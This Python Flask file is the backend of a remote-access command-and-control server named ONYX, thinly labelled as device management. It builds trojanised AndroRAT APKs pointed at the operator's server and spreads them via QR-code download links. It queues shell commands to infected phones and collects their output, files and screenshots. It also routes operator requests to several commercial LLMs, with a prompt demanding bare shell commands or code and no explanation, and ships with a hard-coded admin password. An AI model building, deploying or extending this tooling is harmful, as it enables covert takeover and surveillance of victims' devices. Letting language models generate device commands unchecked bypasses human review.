# =================================================
# ONYX SOVEREIGN C2 – FINAL MERGED BACKEND
# (Groq/OpenRouter support, SQLAlchemy, JWT, SocketIO, APK builder, QR)
# =================================================
import datetime, os, json, uuid, datetime, base64, csv, io, qrcode, time, subprocess, shutil, tempfile
from flask import Flask, request, jsonify, send_file, render_template_string
from flask_socketio import SocketIO, emit
from flask_cors import CORS
from flask_jwt_extended import JWTManager, create_access_token, get_jwt_identity, jwt_required
from flask_bcrypt import Bcrypt
from flask_sqlalchemy import SQLAlchemy
from functools import wraps
from dotenv import load_dotenv
from groq import Groq
load_dotenv()

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', os.urandom(32).hex())
app.config['JWT_SECRET_KEY'] = os.getenv('JWT_SECRET_KEY', os.urandom(32).hex())
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv('DATABASE_URL', 'sqlite:///mdm.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['UPLOAD_FOLDER'] = 'uploads'

CORS(app, resources={
    r"/*": {
        "origins": "*",
        "methods": ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
        "allow_headers": ["Content-Type", "Authorization"]
    }
})
db = SQLAlchemy(app)
jwt = JWTManager(app)
bcrypt = Bcrypt(app)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# ===== MODELS =====
class User(db.Model):
    id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    username = db.Column(db.String(64), unique=True, nullable=False)
    password_hash = db.Column(db.String(128), nullable=False)
    role = db.Column(db.String(20), default='viewer')
    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)

class Device(db.Model):
    id = db.Column(db.String(64), primary_key=True)
    name = db.Column(db.String(128))
    os = db.Column(db.String(32))
    ip = db.Column(db.String(45))
    status = db.Column(db.String(20), default='offline')
    last_seen = db.Column(db.DateTime, default=datetime.datetime.utcnow)
    enrolled_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)
    token = db.Column(db.String(128), unique=True)

class Command(db.Model):
    id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    device_id = db.Column(db.String(64), db.ForeignKey('device.id', ondelete='CASCADE'))
    command = db.Column(db.Text)
    status = db.Column(db.String(20), default='pending')
    result = db.Column(db.Text)
    issued_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)
    executed_at = db.Column(db.DateTime, nullable=True)

class FileRecord(db.Model):
    id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    device_id = db.Column(db.String(64), db.ForeignKey('device.id', ondelete='CASCADE'))
    name = db.Column(db.String(256))
    path = db.Column(db.Text)
    size = db.Column(db.Integer)
    uploaded_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)

class AuditLog(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.String(36), db.ForeignKey('user.id', ondelete='SET NULL'))
    username = db.Column(db.String(64))
    action = db.Column(db.String(64))
    details = db.Column(db.JSON)
    ip = db.Column(db.String(45))
    timestamp = db.Column(db.DateTime, default=datetime.datetime.utcnow)

class Payload(db.Model):
    id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    name = db.Column(db.String(128))
    file_path = db.Column(db.Text)
    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)

class Product(db.Model):
    id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    name = db.Column(db.String(128), nullable=False)
    price = db.Column(db.Integer, nullable=False)
    category = db.Column(db.String(64))
    description = db.Column(db.Text)
    features = db.Column(db.JSON, default=list)
    tag = db.Column(db.String(32))
    active = db.Column(db.Boolean, default=True)
    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)


# ===== DECORATORS =====
def permission_required(permission):
    def decorator(fn):
        @wraps(fn)
        @jwt_required()
        def wrapper(*args, **kwargs):
            user_id = get_jwt_identity()
            user = User.query.get(user_id)
            if not user:
                return jsonify({'error': 'User not found'}), 401
            perms = {
                'admin': ['*'],
                'operator': ['devices:read','devices:write','commands:send','files:read','audit:read','payloads:manage'],
                'viewer': ['devices:read','commands:view','files:read'],
                'auditor': ['audit:read']
            }
            if '*' not in perms.get(user.role, []) and permission not in perms.get(user.role, []):
                return jsonify({'error': 'Insufficient permissions'}), 403
            return fn(*args, **kwargs)
        return wrapper
    return decorator

# ===== ROUTES =====
# Auth
@app.route('/api/auth/login', methods=['POST'])
def login():
    data = request.json
    user = User.query.filter_by(username=data.get('username')).first()
    if not user or not bcrypt.check_password_hash(user.password_hash, data.get('password')):
        return jsonify({'error': 'Invalid credentials'}), 401
    access_token = create_access_token(identity=user.id)
    audit = AuditLog(user_id=user.id, username=user.username, action='login', ip=request.remote_addr)
    db.session.add(audit)
    db.session.commit()
    return jsonify({'access_token': access_token, 'role': user.role})

@app.route('/api/auth/register', methods=['POST'])
@permission_required('users:write')
def register():
    data = request.json
    if User.query.filter_by(username=data.get('username')).first():
        return jsonify({'error': 'Username exists'}), 409
    hashed = bcrypt.generate_password_hash(data.get('password')).decode('utf-8')
    user = User(username=data.get('username'), password_hash=hashed, role=data.get('role','viewer'))
    db.session.add(user)
    db.session.commit()
    return jsonify({'message': 'User created'}), 201

# Devices
@app.route('/api/devices/', methods=['GET'])
@permission_required('devices:read')
def list_devices():
    devices = Device.query.all()
    return jsonify([{
        'id': d.id,
        'name': d.name,
        'os': d.os,
        'ip': d.ip,
        'status': d.status,
        'last_seen': d.last_seen.isoformat()
    } for d in devices])

@app.route('/api/devices/register', methods=['POST'])
def register_device():
    data = request.json
    device_id = data.get('id', str(uuid.uuid4()))
    token = base64.b64encode(os.urandom(24)).decode()
    device = Device(
        id=device_id,
        name=data.get('name', 'Unknown'),
        os=data.get('os', 'Unknown'),
        ip=request.remote_addr,
        status='online',
        token=token
    )
    db.session.add(device)
    db.session.commit()
    audit = AuditLog(action='device_register', details={'device_id': device_id}, ip=request.remote_addr)
    db.session.add(audit)
    db.session.commit()
    return jsonify({'status': 'registered', 'token': token})

@app.route('/api/devices/heartbeat', methods=['POST'])
def heartbeat():
    data = request.json
    device = Device.query.get(data.get('device_id'))
    if not device:
        return jsonify({'error': 'Device not found'}), 404
    device.last_seen = datetime.datetime.utcnow()
    device.status = 'online'
    db.session.commit()
    return jsonify({'status': 'ok'})

@app.route('/api/devices/<device_id>', methods=['DELETE'])
@permission_required('devices:write')
def delete_device(device_id):
    device = Device.query.get(device_id)
    if not device:
        return jsonify({'error': 'Device not found'}), 404
    db.session.delete(device)
    db.session.commit()
    return jsonify({'status': 'deleted'})

# Commands
@app.route('/api/commands/send', methods=['POST'])
@permission_required('commands:send')
def send_command():
    data = request.json
    device = Device.query.get(data.get('device_id'))
    if not device:
        return jsonify({'error': 'Device not found'}), 404
    cmd = Command(
        id=str(uuid.uuid4()),
        device_id=data['device_id'],
        command=data['command']
    )
    db.session.add(cmd)
    db.session.commit()
    socketio.emit('new_command', {
        'cmd_id': cmd.id,
        'command': cmd.command
    }, room=data['device_id'])
    audit = AuditLog(action='command_sent', details={'device_id': data['device_id'], 'command': data['command']}, ip=request.remote_addr)
    db.session.add(audit)
    db.session.commit()
    return jsonify({'cmd_id': cmd.id, 'status': 'queued'})

@app.route('/api/commands/poll/<device_id>', methods=['GET'])
def poll_commands(device_id):
    device = Device.query.get(device_id)
    if not device:
        return jsonify([]), 404
    cmds = Command.query.filter_by(device_id=device_id, status='pending').order_by(Command.issued_at).all()
    result = []
    for c in cmds:
        c.status = 'sent'
        result.append({'id': c.id, 'command': c.command})
    db.session.commit()
    return jsonify(result)

@app.route('/api/commands/result', methods=['POST'])
def command_result():
    data = request.json
    cmd = Command.query.get(data.get('cmd_id'))
    if not cmd:
        return jsonify({'error': 'Command not found'}), 404
    cmd.status = 'completed'
    cmd.result = data.get('result')
    cmd.executed_at = datetime.datetime.utcnow()
    db.session.commit()
    return jsonify({'status': 'ok'})

# Files
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/api/files/upload', methods=['POST'])
def upload_file():
    device_id = request.form.get('device_id')
    file = request.files.get('file')
    if not device_id or not file:
        return jsonify({'error': 'Missing fields'}), 400
    device = Device.query.get(device_id)
    if not device:
        return jsonify({'error': 'Device not found'}), 404
    filename = file.filename
    path = os.path.join(UPLOAD_FOLDER, f"{device_id}_{int(time.time())}_{filename}")
    file.save(path)
    record = FileRecord(device_id=device_id, name=filename, path=path, size=os.path.getsize(path))
    db.session.add(record)
    db.session.commit()
    audit = AuditLog(action='file_upload', details={'device_id': device_id, 'filename': filename}, ip=request.remote_addr)
    db.session.add(audit)
    db.session.commit()
    return jsonify({'status': 'ok', 'path': path})

@app.route('/api/files/list/<device_id>', methods=['GET'])
@permission_required('files:read')
def list_files(device_id):
    files = FileRecord.query.filter_by(device_id=device_id).all()
    return jsonify([{'id': f.id, 'name': f.name, 'size': f.size} for f in files])

@app.route('/api/files/download/<file_id>', methods=['GET'])
@permission_required('files:read')
def download_file(file_id):
    record = FileRecord.query.get(file_id)
    if not record:
        return jsonify({'error': 'File not found'}), 404
    return send_file(record.path, as_attachment=True)

# APK Builder (AndroRAT)
PAYLOAD_FOLDER = 'payloads'
os.makedirs(PAYLOAD_FOLDER, exist_ok=True)

@app.route('/api/apk/build', methods=['POST'])
@permission_required('payloads:manage')
def build_apk():
    data = request.json
    server_ip = data.get('server_ip')
    server_port = data.get('server_port', 5000)
    app_name = data.get('app_name', 'MyApp')
    if not server_ip:
        return jsonify({'error': 'server_ip required'}), 400
    TEMPLATE_DIR = '/tmp/AndroRAT'
    if not os.path.exists(TEMPLATE_DIR):
        subprocess.run(['git', 'clone', 'https://github.com/karma9874/AndroRAT.git', TEMPLATE_DIR], check=True, capture_output=True)
    build_id = str(uuid.uuid4())
    build_dir = tempfile.mkdtemp()
    shutil.copytree(TEMPLATE_DIR, build_dir, dirs_exist_ok=True)
    for root, _, files in os.walk(build_dir):
        for f in files:
            if f.endswith('.java'):
                path = os.path.join(root, f)
                with open(path, 'r') as fp:
                    content = fp.read()
                content = content.replace('wss://your-server.com', f'ws://{server_ip}:{server_port}')
                content = content.replace('wss://127.0.0.1', f'ws://{server_ip}:{server_port}')
                with open(path, 'w') as fp:
                    fp.write(content)
    gradle_cmd = './gradlew' if os.path.exists(os.path.join(build_dir, 'gradlew')) else 'gradle'
    result = subprocess.run(f'cd {build_dir} && {gradle_cmd} assembleDebug', shell=True, capture_output=True, text=True, timeout=600)
    if result.returncode != 0:
        shutil.rmtree(build_dir, ignore_errors=True)
        return jsonify({'error': f'Build failed: {result.stderr}'}), 500
    apk_path = os.path.join(build_dir, 'app/build/outputs/apk/debug/app-debug.apk')
    if not os.path.exists(apk_path):
        shutil.rmtree(build_dir, ignore_errors=True)
        return jsonify({'error': 'APK not found'}), 500
    final_apk = os.path.join(PAYLOAD_FOLDER, f"{app_name}_{build_id}.apk")
    shutil.move(apk_path, final_apk)
    shutil.rmtree(build_dir, ignore_errors=True)
    payload = Payload(name=app_name, file_path=final_apk)
    db.session.add(payload)
    db.session.commit()
    return jsonify({'download_url': f'/api/apk/download/{os.path.basename(final_apk)}'})

@app.route('/api/apk/download/<filename>', methods=['GET'])
def download_apk(filename):
    return send_file(os.path.join(PAYLOAD_FOLDER, filename), as_attachment=True)

@app.route('/api/apk/list', methods=['GET'])
@permission_required('payloads:manage')
def list_payloads():
    payloads = Payload.query.all()
    return jsonify([{'id': p.id, 'name': p.name, 'file_path': p.file_path} for p in payloads])

# Spreader (QR)
@app.route('/api/spreader/generate', methods=['POST'])
@permission_required('payloads:manage')
def generate_link():
    data = request.json
    payload = Payload.query.get(data.get('payload_id'))
    if not payload:
        return jsonify({'error': 'Payload not found'}), 404
    download_url = f"{request.host_url.rstrip('/')}/api/apk/download/{os.path.basename(payload.file_path)}"
    qr = qrcode.QRCode(box_size=10, border=4)
    qr.add_data(download_url)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    buffered = io.BytesIO()
    img.save(buffered, format="PNG")
    qr_base64 = base64.b64encode(buffered.getvalue()).decode()
    return jsonify({'url': download_url, 'qr_code': qr_base64})

# Audit
@app.route('/api/audit/logs', methods=['GET'])
@permission_required('audit:read')
def get_audit_logs():
    logs = AuditLog.query.order_by(AuditLog.timestamp.desc()).limit(100).all()
    return jsonify([{
        'id': l.id,
        'user_id': l.user_id,
        'username': l.username,
        'action': l.action,
        'details': l.details,
        'ip': l.ip,
        'timestamp': l.timestamp.isoformat()
    } for l in logs])

@app.route('/api/audit/export', methods=['GET'])
@permission_required('audit:read')
def export_audit_logs():
    logs = AuditLog.query.all()
    si = io.StringIO()
    cw = csv.writer(si)
    cw.writerow(['id','user_id','username','action','details','ip','timestamp'])
    for l in logs:
        cw.writerow([l.id, l.user_id, l.username, l.action, json.dumps(l.details), l.ip, l.timestamp])
    response = app.response_class(
        response=si.getvalue(),
        mimetype='text/csv',
        headers={'Content-Disposition': 'attachment; filename=audit_logs.csv'}
    )
    return response

# ---- FRONTEND DASHBOARD ----
@app.route('/')
@jwt_required(optional=True)
def dashboard():
    # If no token, show login page, else show dashboard.
    # For simplicity, we'll serve the static HTML embedded.
    try:
        with open('templates/dashboard.html', 'r') as f:
            html = f.read()
        return render_template_string(html)
    except:
        return "<h1>Dashboard not found</h1>", 404

# ===== WEBSOCKET EVENTS =====
@socketio.on('connect')
def handle_connect():
    print('Client connected')

@socketio.on('register_device')
def handle_register(data):
    device_id = data.get('device_id')
    if device_id:
        device = Device.query.get(device_id)
        if device:
            device.status = 'online'
            device.last_seen = datetime.datetime.utcnow()
            db.session.commit()
        emit('registered', {'status': 'ok'})

@socketio.on('command_result')
def handle_command_result(data):
    cmd = Command.query.get(data.get('cmd_id'))
    if cmd:
        cmd.status = 'completed'
        cmd.result = data.get('result')
        cmd.executed_at = datetime.datetime.utcnow()
        db.session.commit()

@socketio.on('screenshot')
def handle_screenshot(data):
    device_id = data.get('device_id')
    image = data.get('image')
    if device_id and image:
        filename = f"screenshot_{device_id}_{int(time.time())}.png"
        path = os.path.join('uploads', filename)
        os.makedirs('uploads', exist_ok=True)
        with open(path, 'wb') as f:
            f.write(base64.b64decode(image))
        record = FileRecord(device_id=device_id, name=filename, path=path, size=os.path.getsize(path))
        db.session.add(record)
        db.session.commit()
        emit('screenshot_received', {'filename': filename})


# ===== REAL GROQ INTEGRATION =====
import uuid as _uuid

_groq_client = None
_command_store = {}

def _get_groq():
    global _groq_client
    if _groq_client is None:
        key = os.getenv("GROQ_API_KEY")
        if not key:
            raise RuntimeError("GROQ_API_KEY not set")
        _groq_client = Groq(api_key=key)
    return _groq_client

GROQ_SYSTEM = """You are a code generator. Given a user request, output ONLY the exact shell command(s) or Python code to achieve it. No explanation, no markdown, no backticks. If ambiguous, output only: ERROR: clarify. Assume Linux/Android/Termux bash environment."""

# ===== OPENROUTER INTEGRATION =====
import requests as _requests

OPENROUTER_URL = "https://openrouter.ai/api/v1/chat/completions"
OPENROUTER_MODELS = [
    "anthropic/claude-3.5-sonnet",
    "openai/gpt-4o-mini",
    "google/gemini-flash-1.5",
    "meta-llama/llama-3.1-70b-instruct",
    "deepseek/deepseek-chat",
    "qwen/qwen-2.5-coder-32b-instruct",
]

def generate_code_openrouter(user_prompt):
    """Generate code via OpenRouter with auto-fallback."""
    api_key = os.getenv("OPENROUTER_API_KEY")
    if not api_key:
        raise Exception("OPENROUTER_API_KEY missing in Railway variables")
    last_err = None
    for model in OPENROUTER_MODELS:
        try:
            headers = {
                "Authorization": "Bearer " + api_key,
                "Content-Type": "application/json",
                "HTTP-Referer": "https://onyx.ai",
                "X-Title": "ONYX MDM"
            }
            payload = {
                "model": model,
                "messages": [
                    {"role": "system", "content": GROQ_SYSTEM},
                    {"role": "user", "content": user_prompt}
                ],
                "temperature": 0.1,
                "max_tokens": 2000
            }
            r = _requests.post(OPENROUTER_URL, json=payload, headers=headers, timeout=90)
            if r.status_code == 200:
                result = r.json()
                code = result["choices"][0]["message"]["content"].strip()
                if code.startswith("```"):
                    lines = code.split("\n")[1:]
                    if lines and lines[-1].strip() == "```":
                        lines = lines[:-1]
                    code = "\n".join(lines)
                return code, model
            last_err = model + ": HTTP " + str(r.status_code)
        except Exception as e:
            last_err = model + ": " + str(e)
    raise Exception("All OpenRouter models failed. Last: " + str(last_err))



@app.route('/command', methods=['POST'])
def external_command():
    data = request.json or {}
    user_cmd = (data.get('command') or '').strip()
    if not user_cmd:
        return jsonify({'error': 'No command'}), 400

    code = None
    used_model = "unknown"
    errors = []

    # Try OpenRouter first
    or_key = os.getenv("OPENROUTER_API_KEY")
    if or_key:
        or_models = [
            "anthropic/claude-3.5-sonnet",
            "openai/gpt-4o-mini",
            "google/gemini-flash-1.5",
            "meta-llama/llama-3.1-70b-instruct",
            "deepseek/deepseek-chat",
        ]
        for m in or_models:
            try:
                headers = {
                    "Authorization": "Bearer " + or_key,
                    "Content-Type": "application/json",
                    "HTTP-Referer": "https://onyx.ai",
                    "X-Title": "ONYX MDM"
                }
                payload = {
                    "model": m,
                    "messages": [
                        {"role": "system", "content": GROQ_SYSTEM},
                        {"role": "user", "content": user_cmd}
                    ],
                    "temperature": 0.1,
                    "max_tokens": 2000
                }
                r = _requests.post("https://openrouter.ai/api/v1/chat/completions",
                                   json=payload, headers=headers, timeout=90)
                if r.status_code == 200:
                    result = r.json()
                    code = result["choices"][0]["message"]["content"].strip()
                    if code.startswith("```"):
                        lines = code.split("\n")[1:]
                        if lines and lines[-1].strip() == "```":
                            lines = lines[:-1]
                        code = "\n".join(lines)
                    used_model = m
                    break
                else:
                    errors.append(m + ": " + str(r.status_code))
            except Exception as e:
                errors.append(m + ": " + str(e)[:50])

    # Fallback: Groq (with valid Groq model)
    if not code:
        groq_key = os.getenv("GROQ_API_KEY")
        if groq_key:
            try:
                from groq import Groq as _G
                gc = _G(api_key=groq_key)
                gr = gc.chat.completions.create(
                    model="openai/gpt-oss-120b",
                    messages=[{"role": "system", "content": GROQ_SYSTEM},
                              {"role": "user", "content": user_cmd}],
                    temperature=0.1, max_tokens=2000
                )
                code = gr.choices[0].message.content.strip()
                used_model = "groq/openai-gpt-oss-120b"
            except Exception as e:
                errors.append("groq: " + str(e)[:80])

    if not code:
        return jsonify({'error': 'All AI failed: ' + ' | '.join(errors)}), 500

    cmd_id = str(_uuid.uuid4())
    _command_store[cmd_id] = code
    return jsonify({
        'command_id': cmd_id,
        'human_readable_summary': "Command: " + user_cmd,
        'model_used': used_model,
        'verified_prerequisites': ['Python', 'Internet'],
        'execution_plan': {
            'steps': ['Run the generated code'],
            'code_snippet': code,
            'expected_output_format': 'Terminal output'
        },
        'risk_assessment': {
            'what_could_go_wrong': 'Review code before execution',
            'rollback_command': 'N/A'
        }
    })

@app.route('/approve', methods=['POST'])
def approve_command():
    data = request.json or {}
    cmd_id = data.get('command_id')
    code = _command_store.pop(cmd_id, None)
    if not code:
        return jsonify({'error': 'Command not found or expired'}), 404
    return jsonify({'code': code})



# ===== CREATE ADMIN USER =====


# ===== ADMIN PRODUCT ENDPOINTS =====
@app.route('/api/admin/products', methods=['GET'])
def admin_list_products():
    """List all products (public - for storefront)"""
    prods = Product.query.filter_by(active=True).all()
    return jsonify([{
        'id': p.id, 'name': p.name, 'price': p.price,
        'category': p.category, 'description': p.description,
        'features': p.features or [], 'tag': p.tag
    } for p in prods])

@app.route('/api/admin/products/all', methods=['GET'])
def admin_list_all_products():
    """List ALL products (admin)"""
    prods = Product.query.all()
    return jsonify([{
        'id': p.id, 'name': p.name, 'price': p.price,
        'category': p.category, 'description': p.description,
        'features': p.features or [], 'tag': p.tag, 'active': p.active
    } for p in prods])

@app.route('/api/admin/products', methods=['POST'])
def admin_create_product():
    data = request.json or {}
    if not data.get('name') or not data.get('price'):
        return jsonify({'error': 'name and price required'}), 400
    p = Product(
        name=data['name'],
        price=int(data['price']),
        category=data.get('category', 'General'),
        description=data.get('description', ''),
        features=data.get('features', []),
        tag=data.get('tag', '')
    )
    db.session.add(p)
    db.session.commit()
    return jsonify({'id': p.id, 'status': 'created'}), 201

@app.route('/api/admin/products/<product_id>', methods=['PUT'])
def admin_update_product(product_id):
    p = Product.query.get(product_id)
    if not p:
        return jsonify({'error': 'not found'}), 404
    data = request.json or {}
    p.name = data.get('name', p.name)
    p.price = int(data.get('price', p.price))
    p.category = data.get('category', p.category)
    p.description = data.get('description', p.description)
    p.features = data.get('features', p.features)
    p.tag = data.get('tag', p.tag)
    p.active = data.get('active', p.active)
    db.session.commit()
    return jsonify({'status': 'updated'})

@app.route('/api/admin/products/<product_id>', methods=['DELETE'])
def admin_delete_product(product_id):
    p = Product.query.get(product_id)
    if not p:
        return jsonify({'error': 'not found'}), 404
    db.session.delete(p)
    db.session.commit()
    return jsonify({'status': 'deleted'})

@app.route('/api/admin/seed', methods=['POST'])
def admin_seed_products():
    """Seed products from JSON (for scraping data)"""
    data = request.json or {}
    items = data.get('products', [])
    count = 0
    for item in items:
        if not item.get('name'): continue
        p = Product(
            name=item['name'],
            price=int(item.get('price', 99)),
            category=item.get('category', 'General'),
            description=item.get('description', ''),
            features=item.get('features', []),
            tag=item.get('tag', '')
        )
        db.session.add(p)
        count += 1
    db.session.commit()
    return jsonify({'seeded': count})



# ===== SaaS Builder Endpoint =====
@app.route('/api/admin/build-saas', methods=['POST', 'OPTIONS'])
def build_saas():
    if request.method == 'OPTIONS':
        return '', 200
    data = request.json or {}
    user_prompt = data.get('prompt', '').strip()
    if not user_prompt:
        return jsonify({'error': 'prompt required'}), 400

    full_prompt = f"""Build a COMPLETE single-file HTML SaaS web application.

REQUIREMENT: {user_prompt}

Rules:
- Output ONLY raw HTML (no markdown, no backticks, no explanation)
- Include Tailwind CSS via CDN
- Include localStorage for data persistence
- Fully functional UI (add/delete/edit as needed)
- Mobile responsive
- Dark theme with purple accent
- Single file, works when opened in browser"""

    try:
        code, model_used = generate_code_openrouter(full_prompt)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

    if code.startswith('```'):
        lines = code.split('\n')[1:]
        if lines and lines[-1].strip() == '```':
            lines = lines[:-1]
        code = '\n'.join(lines)

    return jsonify({
        'status': 'generated',
        'model_used': model_used,
        'html': code,
        'length': len(code)
    })



# ===== TERMINAL LLM (Script Generator) =====
@app.route('/api/admin/terminal-llm', methods=['POST', 'OPTIONS'])
def terminal_llm():
    if request.method == 'OPTIONS':
        return '', 200

    data = request.json or {}
    prompt = data.get('prompt', '').strip()
    language = data.get('language', 'auto').strip().lower()
    if not prompt:
        return jsonify({'error': 'prompt required'}), 400

    lang_map = {
        'python': 'Python 3',
        'javascript': 'JavaScript (Node.js)',
        'bash': 'Bash shell script',
        'typescript': 'TypeScript',
        'go': 'Go',
        'rust': 'Rust',
        'html': 'HTML + CSS + JavaScript (single file)'
    }

    lang_line = f"Language: {lang_map[language]}" if language in lang_map else "Language: Auto-detect best fit"

    full_prompt = f"""You are an expert code generator.

{lang_line}

TASK: {prompt}

STRICT RULES:
1. Output ONLY raw code — no markdown, no backticks, no explanation
2. Include all imports and dependencies
3. Add brief comments for clarity
4. Production-ready quality
5. If the task is unclear, output a minimal working version with a comment: # TODO: clarify

Generate the code now."""

    # Retry with 3 attempts
    last_error = None
    for attempt in range(3):
        try:
            code, model_used = generate_code_openrouter(full_prompt)
            if code.startswith('```'):
                lines = code.split('\n')[1:]
                if lines and lines[-1].strip() == '```':
                    lines = lines[:-1]
                code = '\n'.join(lines)

            ext_map = {
                'python': 'py', 'javascript': 'js', 'bash': 'sh',
                'typescript': 'ts', 'go': 'go', 'rust': 'rs', 'html': 'html'
            }
            ext = ext_map.get(language, 'txt')

            return jsonify({
                'status': 'generated',
                'language': language,
                'model_used': model_used,
                'code': code,
                'extension': ext,
                'length': len(code),
                'attempts': attempt + 1
            })
        except Exception as e:
            last_error = str(e)
            continue

    return jsonify({'error': f'Failed after 3 attempts: {last_error}'}), 500

with app.app_context():
    db.create_all()
    if not User.query.filter_by(username='admin').first():
        hashed = bcrypt.generate_password_hash('admin123').decode('utf-8')
        admin = User(username='admin', password_hash=hashed, role='admin')
        db.session.add(admin)
        db.session.commit()
        print("Admin user created: admin / admin123")



@app.route('/health')
def health_check():
    return jsonify({'status': 'ok', 'service': 'onyx-mdm', 'time': str(datetime.datetime.utcnow())}), 200

@app.route('/')
def root():
    return jsonify({'service': 'ONYX MDM', 'status': 'live', 'version': '1.0'}), 200


if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
